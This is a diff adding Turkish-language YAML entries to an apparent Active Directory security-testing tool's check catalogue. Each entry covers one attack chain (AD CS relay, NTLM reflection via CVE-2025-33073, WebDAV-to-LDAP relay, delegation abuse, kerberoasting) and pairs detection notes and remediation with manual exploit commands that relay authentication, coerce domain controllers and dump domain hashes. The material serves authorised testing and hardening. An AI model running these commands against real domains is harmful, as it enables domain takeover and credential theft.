@@ -1930,3 +1930,162 @@ sccm-relay-takeover:
   references:
     - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md"
     - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-1/elevate-1_description.md"
+
+chain-esc8-coercion:
+  title: "Zincir: coercion + AD CS relay (ESC8/ESC11) → sertifika"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, adcs, esc8, esc11, coercion, relay]
+  summary: "Coerce edilebilir makine + relay'e açık AD CS → makine sertifikası → PKINIT / DCSync."
+  description: >
+    Bir makine (özellikle DC) coerce edilebiliyorsa ve AD CS web enrollment (ESC8)
+    veya ICPR RPC (ESC11) NTLM relay'e açıksa, makinenin kimliği CA'ya relay
+    edilip onun adına sertifika alınır. Sertifikayla PKINIT → makine NT hash'i;
+    makine DC ise DCSync ile tüm domain. Coerce edilen makine CA ile aynı hostsa
+    Windows NTLM reflection'ı engeller — ancak host CVE-2025-33073'e açıksa yine
+    mümkündür; modül bu durumu ayrıca kontrol eder.
+  detect_code: |
+    # correlate modülü: coercion (quickcve/sccm) + adcs-esc8/esc11 (ad) + CA DNS adı (certipy JSON)
+    # + aynı host durumunda ntlm-reflection-33073 (smb)
+  exploit_code: |
+    # MANUEL
+    sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+    python3 PetitPotam.py -u user -p pass <saldirgan-ip> <dc>
+    certipy-ad auth -pfx dc.pfx -dc-ip <dc>          # → DC$ NT hash
+    impacket-secretsdump -hashes :<nthash> 'DOM/DC$'@<dc>
+  remediation: >
+    AD CS web enrollment'ı kapatın ya da HTTPS + EPA zorlayın; ICPR için
+    IF_ENFORCEENCRYPTICERTREQUEST; DC'lerde Spooler'ı kapatın, EFSRPC'yi filtreleyin;
+    CVE-2025-33073 yamasını uygulayın.
+  references:
+    - "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+
+chain-reflection-signing:
+  title: "Zincir: NTLM reflection + SMB signing kapalı → SYSTEM"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, reflection, cve-2025-33073, smb-signing]
+  summary: "Host kendi makine hesabıyla kendi SMB'sine relay edilebiliyor."
+  description: >
+    CVE-2025-33073'e açık ve SMB signing'i zorunlu olmayan bir hostta, hostun
+    kendi makine hesabının kimlik doğrulaması özel bir DNS kaydı ile zorlanıp
+    yine o hostun SMB'sine relay edilir; sonuç hostta SYSTEM yetkisidir. Herhangi
+    bir domain kullanıcısı tetikleyebilir.
+  detect_code: |
+    # correlate modülü: ntlm-reflection-33073 ∩ smb-signing-disabled (aynı IP)
+  exploit_code: |
+    # MANUEL — reflection için özel DNS kaydı (ör. <host>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA)
+    python3 dnstool.py -u 'DOM\user' -p pass -r <özel-kayıt> -d <saldirgan-ip> --action add <dc>
+    sudo ntlmrelayx.py -t smb://<host> -smb2support
+    python3 PetitPotam.py -u user -p pass <özel-kayıt> <host>
+  remediation: >
+    Ekim 2025 güncellemesini (CVE-2025-33073) kurun ve tüm hostlarda SMB signing'i
+    zorunlu kılın.
+  references:
+    - "https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025"
+
+chain-webdav-ldap:
+  title: "Zincir: WebClient + LDAP signing yok → host devralma"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, webdav, ldap, rbcd, shadow-credentials]
+  summary: "HTTP coercion edilen makine hesabı imzasız LDAP'a relay → RBCD / Shadow Creds."
+  description: >
+    WebClient çalışan bir hosta HTTP (WebDAV) üzerinden coercion yapılırsa makine
+    hesabının NTLM'i SMB'den farklı olarak LDAP'a relay edilebilir. DC LDAP
+    signing'i zorlamıyorsa o makine hesabına RBCD (MachineAccountQuota>0 ise yeni
+    makine hesabıyla) veya Shadow Credentials yazılır ve S4U ile hostta
+    Administrator olunur.
+  detect_code: |
+    # correlate modülü: webdav-enabled (poison) + ldap-signing-disabled (ad) [+ machineaccountquota]
+  exploit_code: |
+    # MANUEL
+    sudo ntlmrelayx.py -t ldap://<dc> --delegate-access -smb2support
+    python3 PetitPotam.py -u user -p pass "attacksrv@80/x" <webdav-host>
+    impacket-getST -spn cifs/<host-fqdn> -impersonate Administrator 'DOM/<yeni$>:<parola>' -dc-ip <dc>
+  remediation: >
+    DC'de LDAP signing + channel binding zorunlu; gereksiz WebClient servisini
+    kapatın; MachineAccountQuota=0.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient"
+
+chain-unconstrained-coerce:
+  title: "Zincir: unconstrained delegation + DC coerce → DC TGT"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, unconstrained-delegation, coercion, tgt]
+  summary: "Unconstrained hesap/host + coerce edilebilir DC → DC'nin TGT'si yakalanır."
+  description: >
+    DC dışında unconstrained delegation'a sahip bir hesap veya hostun kontrolü
+    ele geçirildiğinde, coerce edilen DC o hosta kimlik doğrular ve DC'nin
+    TGT'si bellekte yakalanır; bu TGT ile DCSync yapılır.
+  detect_code: |
+    # correlate modülü: unconstrained-delegation (DC hariç) + coercion (DC)
+  exploit_code: |
+    # MANUEL — unconstrained hesabın kontrolüyle (kullanıcı hesabıysa SPN + DNS kaydı gerekir)
+    python3 krbrelayx.py -hashes :<hesap-nthash>
+    python3 printerbug.py DOM/user:pass@<dc> <unconstrained-host>
+  remediation: >
+    DC dışında unconstrained delegation kullanmayın (constrained/RBCD'ye geçin);
+    ayrıcalıklı hesapları "Account is sensitive and cannot be delegated" / Protected
+    Users yapın; DC'lerde Spooler'ı kapatın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
+
+chain-delegation-dc:
+  title: "Zincir: constrained delegation hedefi Domain Controller"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, constrained-delegation, s4u, dc]
+  summary: "Hesap DC servisine delegasyon yapabiliyor → S4U ile DC'de Administrator."
+  description: >
+    Constrained delegation hedefi bir DC servisiyse (CIFS/LDAP/HOST), hesabın
+    kontrolü ele geçirildiğinde S4U2Self/S4U2Proxy ile DC'ye Administrator olarak
+    bilet alınır; protocol transition varsa kullanıcı etkileşimi gerekmez.
+  detect_code: |
+    # correlate modülü: constrained-delegation hedef host'u ∈ DC adları
+  exploit_code: |
+    # MANUEL
+    impacket-getST -spn CIFS/<dc-fqdn> -impersonate Administrator 'DOM/<hesap>:<parola>' -dc-ip <dc>
+    export KRB5CCNAME=Administrator@CIFS_<dc-fqdn>@<REALM>.ccache
+    impacket-secretsdump -k -no-pass <dc-fqdn>
+  remediation: >
+    DC servislerine delegasyonu kaldırın; gerekiyorsa hesabı tier-0 olarak koruyun,
+    güçlü/yönetilen (gMSA) parola kullanın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"
+
+chain-privileged-roast:
+  title: "Zincir: ayrıcalıklı hesabın parolası elde edilebilir"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, kerberoast, asrep, description, privileged]
+  summary: "Roast edilebilir / description parolalı hesap aynı zamanda ayrıcalıklı."
+  description: >
+    Kerberoast / AS-REP ile offline kırılabilir hash'i alınan ya da description
+    alanında parolası bulunan bir hesap adminCount=1 veya bir yönetici grubunun
+    (iç içe dahil) üyesiyse, parolası kırıldığında doğrudan domain/sunucu
+    yönetimi elde edilir.
+  detect_code: |
+    # correlate modülü: kerberoastable / asrep-roastable / description-password ∩ BloodHound ayrıcalıklı hesaplar
+  exploit_code: |
+    # MANUEL — offline kırma
+    hashcat -m 13100 kerberoast.hash wordlist.txt     # TGS
+    hashcat -m 18200 asrep.hash wordlist.txt          # AS-REP
+  remediation: >
+    Ayrıcalıklı hesaplara SPN koymayın (servisler için gMSA), pre-auth'u açık tutun,
+    description'a parola yazmayın, yönetici hesaplarına 25+ karakterli parola.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
